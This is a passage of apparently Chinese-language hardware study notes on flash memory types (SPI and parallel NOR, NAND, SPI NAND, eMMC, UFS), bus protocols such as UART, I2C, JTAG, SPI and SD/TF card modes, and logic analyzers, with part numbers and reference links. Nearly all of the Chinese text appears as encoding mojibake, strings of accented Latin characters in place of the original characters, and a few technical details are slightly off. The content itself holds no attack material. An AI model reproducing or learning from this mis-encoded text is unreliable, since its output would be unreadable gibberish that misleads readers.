æ­¤æ¯”IICé€šä¿¡åè®®çš„IICEEPROMçš„è¯»å†™é€Ÿåº¦ä¸Šè¦å¿«å¾ˆå¤šã€‚SPINorFlashå…·æœ‰NORæŠ€æœ¯FlashMemoryçš„ç‰¹ç‚¹ï¼Œå³ç¨‹åºå’Œæ•°æ®å¯å­˜æ”¾åœ¨åŒä¸€èŠ¯ç‰‡ä¸Šï¼Œæ‹¥æœ‰ç‹¬ç«‹çš„æ•°æ®æ€»çº¿å’Œåœ°å€æ€»çº¿ï¼Œèƒ½å¿«é€Ÿéšæœºè¯»å–ï¼Œå…è®¸ç³»ç»Ÿç›´æ¥ä»Flashä¸­è¯»å–ä»£ç æ‰§è¡Œï¼›å¯ä»¥å•å­—èŠ‚æˆ–å•å­—ç¼–ç¨‹ï¼Œä½†ä¸èƒ½å•å­—èŠ‚æ“¦é™¤ï¼Œå¿…é¡»ä»¥Sectorä¸ºå•ä½æˆ–å¯¹æ•´ç‰‡æ‰§è¡Œæ“¦é™¤æ“ä½œï¼Œåœ¨å¯¹å­˜å‚¨å™¨è¿›è¡Œé‡æ–°ç¼–ç¨‹ä¹‹å‰éœ€è¦å¯¹Sectoræˆ–æ•´ç‰‡è¿›è¡Œé¢„ç¼–ç¨‹å’Œæ“¦é™¤æ“ä½œã€‚\nNorFlashåœ¨æ“¦å†™æ¬¡æ•°ä¸Šè¿œè¿œè¾¾ä¸åˆ°IICEEPROMï¼Œå¹¶ä¸”ç”±äºNORæŠ€æœ¯FlashMemoryçš„æ“¦é™¤å’Œç¼–ç¨‹é€Ÿåº¦è¾ƒæ…¢ï¼Œå—å°ºå¯¸åˆè¾ƒå¤§ï¼Œå› æ­¤æ“¦é™¤å’Œç¼–ç¨‹æ“ä½œæ‰€èŠ±è´¹çš„æ—¶é—´ä¼šå¾ˆé•¿ï¼›ä½†SPINorFlashæ¥å£ç®€å•ï¼Œä½¿ç”¨çš„å¼•è„šå°‘ï¼Œæ˜“äºè¿æ¥ï¼Œæ“ä½œæ–¹ä¾¿ï¼Œå¹¶ä¸”å¯ä»¥åœ¨èŠ¯ç‰‡ä¸Šç›´æ¥è¿è¡Œä»£ç ï¼Œå…¶ç¨³å®šæ€§å‡ºè‰²ï¼Œä¼ è¾“é€Ÿç‡é«˜ï¼Œåœ¨å°å®¹é‡æ—¶å…·æœ‰å¾ˆé«˜çš„æ€§ä»·æ¯”ï¼Œè¿™ä½¿å…¶å¾ˆé€‚åˆåº”äºåµŒå…¥å¼ç³»ç»Ÿä¸­ä½œä¸ºFLASHROMï¼Œæ‰€ä»¥åœ¨å¸‚åœºçš„å ç”¨ç‡éå¸¸é«˜ã€‚\nå¸¸è§åˆ°çš„S25FL128ã€MX25L1605ã€W25Q64ç­‰å‹å·éƒ½æ˜¯SPINorFlashï¼Œå…¶å¸¸è§çš„å°è£…å¤šä¸ºSOP8ï¼ŒSOP16ï¼ŒWSON8ï¼ŒUS0N8ï¼ŒQFN8ã€BGA24ç­‰\nParallelNorFalshï¼ˆCFIFlashï¼‰ ParallelNorFalshï¼Œä¹Ÿå«åšå¹¶è¡ŒNorFlashï¼Œé‡‡ç”¨çš„Parallelæ¥å£é€šä¿¡åè®®ã€‚æ‹¥æœ‰ç‹¬ç«‹çš„æ•°æ®çº¿å’Œåœ°å€æ€»çº¿ï¼Œå®ƒåŒæ ·ç»§æ‰¿äº†NORæŠ€æœ¯FlashMemoryçš„æ‰€æœ‰ç‰¹ç‚¹ï¼›ç”±äºé‡‡ç”¨äº†Parallelæ¥å£ï¼ŒParallelNorFalshç›¸å¯¹äºSPINorFlashï¼Œæ”¯æŒçš„å®¹é‡æ›´å¤§ï¼Œè¯»å†™çš„é€Ÿåº¦æ›´å¿«ï¼Œä½†æ˜¯ç”±äºå ç”¨çš„åœ°å€çº¿å’Œæ•°æ®çº¿å¤ªå¤šï¼Œåœ¨ç”µè·¯ç”µå­è®¾è®¡ä¸Šä¼šå ç”¨å¾ˆå¤šèµ„æºã€‚ParallelNorFalshè¯»å†™æ—¶åºç±»ä¼¼äºSRAMï¼Œåªæ˜¯å†™çš„æ¬¡æ•°è¾ƒå°‘ï¼Œé€Ÿåº¦ä¹Ÿæ…¢ï¼Œç”±äºå…¶è¯»æ—¶åºç±»ä¼¼äºSRAMï¼Œè¯»åœ°å€ä¹Ÿæ˜¯çº¿æ€§ç»“æ„ï¼Œæ‰€ä»¥å¤šç”¨äºä¸éœ€è¦ç»å¸¸æ›´æ”¹ç¨‹åºä»£ç çš„æ•°æ®å­˜å‚¨ã€‚\nå¸¸è§åˆ°çš„S29GL128ã€MX29GL512ã€SST39VF020ç­‰å‹å·éƒ½æ˜¯ParallelNorFlashï¼Œå…¶å¸¸è§çš„å°è£…å¤šä¸ºTSSOP32ã€TSOP48ã€BGA64ï¼ŒPLCC32ç­‰ã€‚\nNAND Flash NANDFlashå±äºéæ˜“å¤±æ€§å­˜å‚¨å™¨ï¼Œå¯¹äºåµŒå…¥å¼è®¾å¤‡ï¼Œä¸€èˆ¬ä½¿ç”¨SLCï¼Œå•ä½æ˜¯1-bitï¼Œæ˜¯ä¸€ç§æµ®æ …ç»“æ„ï¼Œå¯ä»¥æ•è·ç”µå­å¹¶ä¸”å¤–éƒ¨ç»ç¼˜ï¼Œæ–­ç”µä¹‹åå¯ä»¥ä¿ç•™æ•°æ®ã€‚Flashéƒ½ä¸æ”¯æŒè¦†ç›–ï¼Œå³å†™å…¥æ“ä½œåªèƒ½åœ¨ç©ºæˆ–å·²æ“¦é™¤çš„å•å…ƒå†…è¿›è¡Œã€‚æ“¦é™¤æ–¹æ³•æ˜¯åœ¨æºæåŠ æ­£ç”µå‹åˆ©ç”¨ç¬¬ä¸€çº§æµ®ç©ºæ …ä¸æ¼æä¹‹é—´çš„éš§é“æ•ˆåº”ï¼Œå°†æ³¨å…¥åˆ°æµ®ç©ºæ …çš„è´Ÿç”µè·å¸å¼•åˆ°æºæã€‚ç”±äºåˆ©ç”¨æºæåŠ æ­£ç”µå‹æ“¦é™¤ï¼Œå› æ­¤å„å•å…ƒçš„æºæè”åœ¨ä¸€èµ·ï¼Œè¿™æ ·ï¼Œæ“¦é™¤ä¸èƒ½æŒ‰å­—èŠ‚æ“¦é™¤ï¼Œè€Œæ˜¯å…¨ç‰‡æˆ–è€…åˆ†å—æ“¦é™¤ã€‚\nNANDflashä¸€èˆ¬æ¥è¯´åˆ†ä¸ºå¤šä¸ªåŒºï¼ŒåŒºæ˜¯åœ¨é€»è¾‘å±‚é¢çš„æ¦‚å¿µï¼Œä¸æ¶‰åŠç‰©ç†å±‚ã€‚ä¸€ä¸ªåŒºæ˜¯ç”±å¤šä¸ªå—ç»„æˆçš„ï¼Œä¸€èˆ¬ä¸º256-1024ä¸ªã€‚å—æ˜¯ç”±å¤šä¸ªé¡µç»„æˆçš„ï¼Œé¡µçš„å¤§å°é€šå¸¸æ˜¯512å­—èŠ‚çš„å€æ•°ï¼Œä¸€èˆ¬ä¸º512å­—èŠ‚ã€‚æ¯ä¸€é¡µåˆåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯ä¸»æ•°æ®åŒºï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯å†—ä½™åŒºã€‚ä¸»æ•°æ®åŒºå†…å­˜å‚¨æ•°æ®éƒ¨åˆ†ï¼Œå†—ä½™åŒºå†…å­˜å‚¨æ ¡éªŒä¿¡æ¯ï¼Œç”¨äºæ£€æµ‹æ˜¯å¦å‡ºç°åå—ã€‚\nNANDflashå¯Œæœ‰æ•ˆç‡çš„æ¶æ„è®¾è®¡ä½¿å¾—ç›¸åŒå®¹é‡ä¸‹å…¶å•å…ƒå™¨ä»¶çš„å¤§å°ä»…ç›¸å½“äºNORflashçš„ä¸€åŠï¼Œç”Ÿäº§å·¥è‰ºç®€å•æ›´æ˜¯è®©NANDflashåœ¨ç›¸åŒå¤§å°çš„å™¨ä»¶ä¸Šæä¾›æ›´å¼ºå¤§çš„å¯†é›†åº¦å’Œå­˜å‚¨å®¹é‡ã€‚ä¸€èˆ¬æ¥è¯´NANDflashçš„å­˜å‚¨å®¹é‡åœ¨16Må­—èŠ‚å’Œ512Må­—èŠ‚ä¹‹é—´ã€‚\nNANDflashæ˜¯é€šè¿‡å¤æ‚çš„I/Oæ¥å£è¿›è¡Œé€šä¿¡ï¼Œå…·ä½“ä½¿ç”¨8ä¸ªå¼•è„šä¼ é€åœ°å€ã€æ§åˆ¶ç­‰ä¿¡å·ï¼Œè€Œä¸”æ¥å£æ ‡å‡†ä¸ç»Ÿä¸€ï¼Œæ•°æ®æ¯æ¬¡å­˜å–é‡ä¸€èˆ¬512å­—èŠ‚ã€‚NANDflashè¿™ç§ç»“æ„ä¸€èˆ¬é€‚ç”¨äºå¯¹æ•°æ®çš„å­˜å‚¨ã€‚\nNANDflashä¹Ÿæ˜¯è¢«åˆ†ä¸ºå¤šä¸ªå—ï¼Œæ•°æ®çš„å†™å…¥æ˜¯ä»¥å—ä¸ºå•ä½çš„ï¼Œåœ¨å†™å…¥æ•°æ®å—ä¹‹å‰å¿…é¡»å¯¹ç›¸åº”çš„å—è¿›è¡Œæ“¦é™¤ã€‚æ¯æ¬¡æ“¦é™¤çš„å®¹é‡æ˜¯ä»¥8-32KBçš„å—ä¸ºå•ä½ï¼Œæ“¦é™¤æ—¶é—´å¤§çº¦ä¸º4msã€‚è¿™å°±ä½¿å¾—å…¶è¯»å†™é€Ÿåº¦è¾ƒNORflashå¿«å¾ˆå¤šNANDflashè®¾è®¡äº†ä¸€ç§é«˜å¯†åº¦å’Œå¤§å®¹é‡å•å…ƒå­˜å‚¨æ–¹å¼ï¼Œè€Œä¸”æ“¦é™¤è¿‡ç¨‹æ¯”è¾ƒå¿«ï¼Œå†™é€Ÿåº¦æ¯”NORè¦å¿«çš„å¤šã€‚å•çº¯çš„NANDå­˜å‚¨è®¾å¤‡ä¸»è¦ç”¨æ¥è¿›è¡Œæ•°æ®å­˜å‚¨ï¼Œå¦‚æœè®¾å¤‡å†…éƒ¨æœ‰ç‰‡å†…æ‰§è¡Œä»£ç åˆ™ä¸€èˆ¬æ¥è¯´ä¼šå­˜å‚¨åœ¨NORä¸­ã€‚\nONFIæ ‡å‡†å®šä¹‰äº†ä¸€äº›å¸¸ç”¨çš„NANDå°è£…ï¼ŒNANDFlashä¸€èˆ¬æ˜¯TSOPå’ŒBGAçš„å°è£…ï¼Œéƒ½ä½¿ç”¨SMTçš„è´´è£…æ–¹å¼ã€‚\nParallelNandFlash ParallelNandFlashåŒæ ·é‡‡ç”¨äº†Parallelæ¥å£é€šä¿¡åè®®ï¼ŒNandFlashåœ¨å·¥è‰ºåˆ¶ç¨‹æ–¹é¢åˆ†æœ‰ä¸‰ç§ç±»å‹ï¼šSLCã€MLCã€TLCã€‚\nNandFlashæŠ€æœ¯FlashMemoryå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼šä»¥é¡µä¸ºå•ä½è¿›è¡Œè¯»å’Œç¼–ç¨‹æ“ä½œï¼Œä»¥å—ä¸ºå•ä½è¿›è¡Œæ“¦é™¤æ“ä½œï¼›å…·æœ‰å¿«ç¼–ç¨‹å’Œå¿«æ“¦é™¤çš„åŠŸèƒ½ï¼Œå…¶å—æ“¦é™¤æ—¶é—´æ˜¯2msï¼Œè€ŒNORæŠ€æœ¯çš„å—æ“¦é™¤æ—¶é—´è¾¾åˆ°å‡ ç™¾msï¼›èŠ¯ç‰‡å°ºå¯¸å°ï¼Œå¼•è„šå°‘ï¼Œæ˜¯ä½æˆæœ¬ï¼ˆbitcostï¼‰æœ€ä½çš„å›ºæ€å­˜å‚¨å™¨;èŠ¯ç‰‡åŒ…å«æœ‰åå—ï¼Œå…¶æ•°ç›®å–å†³äºå­˜å‚¨å™¨å¯†åº¦ã€‚åå—ä¸ä¼šå½±å“æœ‰æ•ˆå—çš„æ€§èƒ½ï¼Œä½†è®¾è®¡è€…éœ€è¦æœ‰ä¸€å¥—çš„åå—ç®¡ç†ç­–ç•¥ã€‚\nå¯¹æ¯”ParallelNorFalshï¼ŒNandFlashåœ¨æ“¦é™¤ã€è¯»å†™æ–¹é¢ï¼Œé€Ÿåº¦å¿«ï¼Œä½¿ç”¨æ“¦å†™æ¬¡æ•°æ›´å¤šï¼Œå¹¶ä¸”å®ƒå¼ºè°ƒæ›´é«˜çš„æ€§èƒ½ï¼Œæ›´ä½çš„æˆæœ¬ï¼Œæ›´å°çš„ä½“ç§¯ï¼Œæ›´å¤§çš„å®¹é‡ï¼Œæ›´é•¿çš„ä½¿ç”¨å¯¿å‘½ã€‚è¿™ä½¿NandFlashå¾ˆæ“…äºå­˜å‚¨çº¯èµ„æ–™æˆ–æ•°æ®ç­‰ï¼Œåœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­ç”¨æ¥æ”¯æŒæ–‡ä»¶ç³»ç»Ÿã€‚å…¶ä¸»è¦ç”¨æ¥æ•°æ®å­˜å‚¨ï¼Œå¤§éƒ¨åˆ†çš„Uç›˜éƒ½æ˜¯ä½¿ç”¨NandFlashï¼Œå½“å‰NandFlashåœ¨åµŒå…¥å¼äº§å“ä¸­åº”ç”¨ä»ç„¶æä¸ºå¹¿æ³›ï¼Œå› æ­¤åå—ç®¡ç†ã€æ‰ç”µä¿æŠ¤ç­‰æªæ–½å°±éœ€è¦ä¾èµ–NandFlashä½¿ç”¨å‚å®¶é€šè¿‡è½¯ä»¶è¿›è¡Œå®Œå–„ã€‚\nå¸¸è§åˆ°çš„S34ML01G100ã€MX30LF2G18ACã€MT29F4G08ABADAç­‰å‹å·éƒ½æ˜¯ParallelNandFlashï¼Œå…¶å¸¸è§çš„å°è£…å¤šä¸ºTSOP48ã€BGA63ã€BGA107ï¼ŒBGA137ç­‰ã€‚\nSPINandFlash SPINandFlashï¼Œé‡‡ç”¨äº†SPINorFlashä¸€æ ·çš„SPIçš„é€šä¿¡åè®®ï¼Œåœ¨è¯»å†™çš„é€Ÿåº¦ä¸Šæ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œä½†åœ¨å­˜å‚¨ç»“æ„ä¸Šå´é‡‡ç”¨äº†ä¸ParallelNandFlashç›¸åŒçš„ç»“æ„ï¼Œæ‰€ä»¥SPInandç›¸å¯¹äºSPInorFlashå…·æœ‰æ“¦å†™çš„æ¬¡æ•°å¤šï¼Œæ“¦å†™é€Ÿåº¦å¿«çš„ä¼˜åŠ¿ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨ä»¥åŠä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šåŒæ ·è·ŸParallelNandFlashä¸€æ ·ä¼šå‡ºç°åå—ï¼Œå› æ­¤ï¼Œä¹Ÿéœ€è¦åšç‰¹æ®Šåå—å¤„ç†æ‰èƒ½ä½¿ç”¨ã€‚\nSPINandFlashç›¸å¯¹æ¯”ParallelNandFlashè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„ç‰¹ç‚¹ï¼Œé‚£å°±æ˜¯èŠ¯ç‰‡è‡ªå·±æœ‰å†…éƒ¨ECCçº é”™æ¨¡å—ï¼Œç”¨æˆ·æ— éœ€å†ä½¿ç”¨ECCç®—æ³•è®¡ç®—çº é”™ï¼Œç”¨æˆ·å¯ä»¥åœ¨ç³»ç»Ÿåº”ç”¨å½“ä¸­å¯ä»¥ç®€åŒ–ä»£ç ï¼Œç®€å•æ“ä½œã€‚\nå¸¸è§åˆ°çš„W25N01GVZEIGã€GD5F4GQ4UBYIGã€F50L1G41Aç­‰å‹å·éƒ½æ˜¯SPINandFlashï¼Œå…¶å¸¸è§çš„å°è£…å¤šä¸ºQFN8ã€BGA24ç­‰ã€‚\nMMC MultiMediaCard\nhttps://en.wikipedia.org/wiki/MultiMediaCard\neMMC https://en.wikipedia.org/wiki/MultiMediaCard#eMMC\neMMCé‡‡ç”¨ç»Ÿä¸€çš„MMCæ ‡å‡†æ¥å£ï¼Œè‡ªèº«é›†æˆMMCControllerï¼Œå­˜å‚¨å•å…ƒä¸NandFlashç›¸åŒã€‚é’ˆå¯¹Flashçš„ç‰¹æ€§ï¼ŒeMMCäº§å“å†…éƒ¨å·²ç»åŒ…å«äº†Flashç®¡ç†æŠ€æœ¯ï¼ŒåŒ…æ‹¬é”™è¯¯æ¢æµ‹å’Œçº æ­£ï¼ŒFlashå¹³å‡æ“¦å†™ï¼Œåå—ç®¡ç†ï¼Œæ‰ç”µä¿æŠ¤ç­‰æŠ€æœ¯ã€‚MMCæ¥å£é€Ÿåº¦é«˜è¾¾æ¯ç§’52MBytesï¼ŒeMMCå…·æœ‰å¿«é€Ÿã€å¯å‡çº§çš„æ€§èƒ½ï¼ŒåŒæ—¶å…¶æ¥å£ç”µå‹å¯ä»¥æ˜¯1.8væˆ–è€…æ˜¯3.3vã€‚\neMMCç›¸å½“äºNandFlash+ä¸»æ§ICï¼Œå¯¹å¤–çš„æ¥å£åè®®ä¸SDã€TFå¡ä¸€æ ·ï¼Œä¸»è¦æ˜¯é’ˆå¯¹æ‰‹æœºæˆ–å¹³æ¿ç”µè„‘ç­‰äº§å“çš„å†…åµŒå¼å­˜å‚¨å™¨æ ‡å‡†è§„æ ¼ã€‚eMMCçš„ä¸€ä¸ªæ˜æ˜¾ä¼˜åŠ¿æ˜¯åœ¨å°è£…ä¸­é›†æˆäº†ä¸€ä¸ªæ§åˆ¶å™¨ï¼Œå®ƒæä¾›æ ‡å‡†æ¥å£å¹¶ç®¡ç†é—ªå­˜ï¼Œä½¿å¾—æ‰‹æœºå‚å•†å°±èƒ½ä¸“æ³¨äºäº§å“å¼€å‘çš„å…¶å®ƒéƒ¨åˆ†ï¼Œå¹¶ç¼©çŸ­å‘å¸‚åœºæ¨å‡ºäº§å“çš„æ—¶é—´ã€‚è¿™äº›ç‰¹ç‚¹å¯¹äºå¸Œæœ›é€šè¿‡ç¼©å°å…‰åˆ»å°ºå¯¸å’Œé™ä½æˆæœ¬çš„NANDä¾›åº”å•†æ¥è¯´ï¼ŒåŒæ ·çš„é‡è¦ã€‚\neMMCç”±ä¸€ä¸ªåµŒå…¥å¼å­˜å‚¨è§£å†³æ–¹æ¡ˆç»„æˆï¼Œå¸¦æœ‰MMCï¼ˆå¤šåª’ä½“å¡ï¼‰æ¥å£ã€å¿«é—ªå­˜å‚¨å™¨è®¾å¤‡ï¼ˆNandFlashï¼‰åŠä¸»æ§åˆ¶å™¨ï¼Œæ‰€æœ‰éƒ½åœ¨ä¸€ä¸ªå°å‹çš„BGAå°è£…ï¼Œæœ€å¸¸è§çš„æœ‰BGA153å°è£…;æˆ‘ä»¬é€šå¸¸è§åˆ°çš„KLMAG8DEDDã€THGBMAG8B4JBAIMã€EMMC04G-S100ç­‰å‹å·éƒ½æ˜¯eMMCFlashã€‚eMMCFlashå­˜å‚¨å®¹é‡å¤§ï¼Œå¸‚åœºä¸Š32GByteå®¹é‡éƒ½å¸¸è§äº†ï¼Œå…¶å¸¸è§çš„å°è£…å¤šä¸ºBGA153ã€BGA169ã€BGA100ç­‰ã€‚\nUFS https://en.wikipedia.org/wiki/Universal_Flash_Storage èŠ¯ç‰‡å°è£… https://www.sohu.com/a/158654863_609521\nhttps://www.youtube.com/watch?v=2ua8PeP9ql4\u0026amp;t=153s\nhttps://zhuanlan.zhihu.com/p/509647754\nhttps://semiwiki.com/semiconductor-services/308968-semiconductor-packaging-history-primer/\nåè®® UART https://zh.wikipedia.org/zh-cn/UART RS232 https://zh.wikipedia.org/zh-cn/RS-232 I2C https://zh.wikipedia.org/wiki/I%C2%B2C JTAG https://en.wikipedia.org/wiki/JTAG https://www.xjtag.com/zh-hans/about-jtag/what-is-jtag/ https://iot-security.wiki/hardware-security/debug/jtag.html SPI TF/SD SDå¡çš„å†…éƒ¨ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯åŒºåˆ†ä¸ºslaveå¡æ§åˆ¶å™¨ï¼ˆCard Controllerï¼‰ã€å¡å¯„å­˜å™¨ç»„ã€å†…å­˜æ§åˆ¶å™¨ï¼ˆMemory Controllerï¼‰å’Œå†…å­˜ï¼ˆMemory Chipï¼‰4éƒ¨åˆ†ã€‚\nslaveå¡æ§åˆ¶å™¨ä¸»è¦å®Œæˆä»¥ä¸‹åŠŸèƒ½âˆ¶\nï¼ˆ1ï¼‰æ¥æ”¶å¡HOSTæ§åˆ¶å™¨å‘é€çš„æŒ‡ä»¤ï¼Œå¹¶è¿›è¡ŒæŒ‡ä»¤æ‹†åŒ…ï¼Œè¿”å›ç›¸åº”çš„å“åº”ï¼›\nï¼ˆ2ï¼‰æ¥æ”¶å¡HOSTæ§åˆ¶å™¨å‘é€æ•°æ®ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œæ‹†åŒ…ï¼Œè¿”å›ç›¸åº”çš„å“åº”ï¼›\nï¼ˆ3ï¼‰æ¥æ”¶å†…å­˜æ§åˆ¶å™¨å‘é€çš„æ•°æ®ï¼Œæ ¹æ®SD3.0åè®®ï¼Œå¯¹æ•°æ®è¿›è¡Œæ‰“åŒ…ï¼Œå°†å…¶å‘é€ç»™å¡HOSTæ§åˆ¶å™¨ã€‚\nï¼ˆ4ï¼‰é€šçŸ¥å†…å­˜æ§åˆ¶å™¨æ¥æ”¶ç”±å¡HOSTæ§åˆ¶å™¨å‘é€çš„ã€å·²ç»è¢«æ‹†åŒ…çš„æ•°æ®ã€‚\nå¡å¯„å­˜å™¨ç»„å†…å­˜æ”¾å¡æ”¯æŒçš„ç‰¹æ€§æˆ–è€…å‚æ•°ï¼Œå¯é€šè¿‡ç‰¹å®šçš„æŒ‡ä»¤è¿›è¡Œè¯»å–ã€‚SD3.0åè®®å®šä¹‰äº†8ä¸ªå¯„å­˜å™¨ç”¨æ¥ä½œä¸ºå­˜å‚¨å¡ä¸SDå¡HOSTæ§åˆ¶å™¨äº¤äº’çš„æ¥å£ï¼ŒåŒ…æ‹¬4ä¸ªæè¿°å¡ç‰‡è¯¦ç»†ä¿¡æ¯çš„å¯„å­˜å™¨ï¼ˆOCRã€CIDã€SCRã€CSDï¼‰ã€2ä¸ªé…ç½®å¯„å­˜å™¨ï¼ˆRCAã€DSRï¼‰ã€2ä¸ªæè¿°å¼ºåˆ¶å‹çš„å¡çŠ¶æ€ä¿¡æ¯å¯„å­˜å™¨ï¼ˆSSRã€CSï¼‰ã€‚é€šè¿‡ä¸“ç”¨å‘½ä»¤å¯è®¿é—®è¿™äº›å¯„å­˜å™¨ï¼Œè·å¾—å¡æ”¯æŒçš„ç‰¹æ€§æˆ–è€…è®¾ç½®å‚æ•°ã€‚\nå†…å­˜æ§åˆ¶å™¨å®Œæˆå¯¹å†…å­˜çš„è¯»å†™ã€‚å†…å­˜å®Œæˆå¯¹æ•°æ®çš„å­˜å‚¨ã€‚\nTFå¡é‡‡ç”¨SDå¡æ¶æ„ï¼Œè¯»å†™åè®®ä¸SDå¡ä¸€è‡´ï¼Œä½†åªæœ‰ä¸€æ ¹åœ°çº¿ï¼Œå…¶å®ƒé’ˆè„šä¸SDå¡ç›¸åŒã€‚TFå¡å’ŒSDå¡çš„é’ˆè„šå¯¹åº”å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nSDå·¥ä½œæ¨¡å¼\nSDå¡æœ‰ä¸¤ç§å·¥ä½œæ¨¡å¼âˆ¶SDæ¨¡å¼å’ŒSPIæ¨¡å¼ã€‚å…¶ä¸­SDæ¨¡å¼å…è®¸4æ¡æ•°æ®çº¿å¹¶è¡Œå·¥ä½œï¼Œä¸»è¦åº”ç”¨äºå¯¹æ•°æ®ä¼ è¾“é€Ÿç‡è¦æ±‚è¾ƒé«˜çš„åœºåˆï¼›è€ŒSPIæ¨¡å¼ä»…èƒ½å•æ•°æ®çº¿ä¼ è¾“ï¼Œä¼ è¾“é€Ÿåº¦è¾ƒæ…¢ã€‚åœ¨SD/TFå¡ä¸Šç”µä¹‹åï¼Œå¯é€šè¿‡å‘é€ç‰¹å®šçš„æŒ‡ä»¤ï¼Œå°†å¡ç½®äºæŸç§å·¥ä½œæ¨¡å¼ã€‚\nï¼ˆ1ï¼‰SDæ¨¡å¼\nSDæ¨¡å¼æ˜¯ä¸€ç§å¼‚æ­¥ä¸²è¡Œé€šä¿¡æ¥å£æ¨¡å¼ã€‚åœ¨SDå·¥ä½œæ¨¡å¼ä¸‹ï¼ŒCMDå¼•è„šä¸ºåŒå‘çš„å‘½ä»¤/å“åº”ä¿¡å·ï¼Œä»è¯¥CMDçº¿ä¸Šä¸²è¡Œä¼ è¾“ï¼Œå‘½ä»¤å¯ä»¥ä»¥å•æœºå¯»å€ï¼ˆå¯»å€å‘½ä»¤ï¼‰æˆ–å‘¼å«æ‰€æœ‰å¡ï¼ˆå¹¿æ’­å‘½ä»¤ï¼‰æ–¹å¼å‘é€ï¼›å“åº”æ˜¯å¯¹ä¹‹å‰å‘½ä»¤çš„å›ç­”ï¼Œå¯ä»¥æ¥è‡ªå•æœºæˆ–æ‰€æœ‰å¡ï¼›DATOï½3ä¸º4ä¸ªåŒå‘çš„æ•°æ®ä¿¡å·ã€‚\nSDæ¨¡å¼çš„æ€»çº¿æ‹“æ‰‘ç»“æ„ä¸ºå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æ‰€æœ‰å¡ä½¿ç”¨å…¬å…±çš„æ—¶é’ŸCLKã€ç”µæºVsså’Œåœ°ä¿¡å·Vppï¼Œç‹¬ç«‹çš„å‘½ä»¤æ€»çº¿ï¼ˆCMDï¼‰å’Œæ•°æ®æ€»çº¿ï¼ˆDAT0~DAT3ï¼‰ã€‚ä¸Šç”µåï¼ŒSDå¡é»˜è®¤ä½¿ç”¨DATOï¼Œä¸»æœºå¯ä»¥é€šè¿‡åˆå§‹åŒ–æ¥æ”¹å˜çº¿å®½ã€‚ä½†æ˜¯ï¼Œå„ä¸ªSDå¡ä¸èƒ½å…±ç”¨å‘½ä»¤ã€å›å¤å’Œæ•°æ®ï¼ˆDATOï½3ï¼‰ã€‚\nSPIæ¨¡å¼\nSPIï¼ˆSerial Peripheral Interfaceï¼Œä¸²è¡Œå¤–è®¾æ¥å£ï¼‰æ¨¡å¼æ˜¯ä¸€ç§åŒæ­¥ä¸²è¡Œé€šä¿¡æ¨¡å¼ï¼Œä½¿ç”¨4ä¸ªä¿¡å·çº¿âˆ¶ä¸²è¡Œæ—¶é’Ÿçº¿ï¼ˆSCKï¼‰ã€ä¸»æœºè¾“å…¥/ä»æœºè¾“å‡ºçº¿ï¼ˆDOï¼‰ã€ä¸»æœºè¾“å‡º/ä»æœºè¾“å…¥çº¿ï¼ˆDIï¼‰å’Œä½¿èƒ½ä¿¡å·çº¿ï¼ˆCSï¼‰ã€‚\nSPIæ¨¡å¼çš„æ€»çº¿å…è®¸é€šè¿‡2é€šé“ï¼ˆæ•°æ®è¾“å…¥å’Œè¾“å‡ºï¼‰ä¼ è¾“æ•°æ®ï¼Œå…¶æ‹“æ‰‘ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚å½“SPIæ€»çº¿ä¸ŠæŒ‚æ¥Nå¼ å¡æ—¶ï¼Œéœ€è¦Nä¸ªCSç‰‡é€‰ä¿¡å·ã€‚SPIæ¨¡å¼ç›¸å¯¹äºSDæ¨¡å¼çš„ä¸è¶³ä¹‹å¤„æ˜¯é€Ÿåº¦åä½ã€‚\nSDå¡å¯åŠ¨æ—¶ï¼Œé»˜è®¤é‡‡ç”¨SDæ¨¡å¼ã€‚å®ƒå°†åœ¨CSä¿¡å·æœ‰æ•ˆï¼ˆä½ç”µå¹³ï¼‰æ—¶æ¥æ”¶ä¸€ä¸ªå¤ä½å‘½ä»¤ï¼ˆCMD0ï¼‰æ¥è¿›å…¥SPIæ¨¡å¼ã€‚å¦‚æœè¯¥å¡è®¤ä¸ºå¿…é¡»åœç•™åœ¨SDæ¨¡å¼ï¼Œé‚£ä¹ˆå®ƒå°†ä¸åº”ç­”è¿™ä¸ªå‘½ä»¤å¹¶ç»§ç»­ä¿æŒåœ¨SDæ¨¡å¼ã€‚å¦‚æœå¯ä»¥è½¬æ¢åˆ°SPIæ¨¡å¼ï¼Œåˆ™ä¼šè½¬æ¢åˆ°SPIæ¨¡å¼å¹¶ç”¨SPIæ¨¡å¼çš„RIåº”ç­”æ¥å›åº”ï¼Œè€Œè®©å¡è¿”å›SDæ¨¡å¼çš„å”¯ä¸€åŠæ³•æ˜¯é‡æ–°åŠ ç”µã€‚SPIæ¨¡å¼ä¸‹ï¼Œé»˜è®¤çš„å‘½ä»¤ç»“æ„/åè®®CRCæ£€æŸ¥æ˜¯å¤±æ•ˆçš„ã€‚ç”±äºå¡åœ¨ç”µæºå¼€å¯æ—¶æ€»æ˜¯å¤„äºSDæ¨¡å¼ï¼ŒCMDOå‘½ä»¤å¿…é¡»é™„å¸¦ä¸€ä¸ªåˆæ³•çš„CRCå­—èŠ‚ï¼ˆå³ä½¿è¿™ä¸ªå‘½ä»¤ä½¿ç”¨äº†SPIç»“æ„æ¥å‘é€ï¼‰ã€‚ä¸€æ—¦è¿›å…¥SPIæ€»çº¿æ¨¡å¼ï¼ŒCRCå°±è¢«é»˜è®¤ä¸ºå¤±æ•ˆã€‚\nå·¥å…· é€»è¾‘åˆ†æä»ª https://en.wikipedia.org/wiki/Logic_analyzer https://zhuanlan.zhihu.com/p/94386957 https://www.anquanke.com/post/id/276280 ä¸€æ¬¾é€»è¾‘åˆ†æä»ªçš„æ ·æœ¬ï¼š\nhttp://www.qdkingst.com/cn 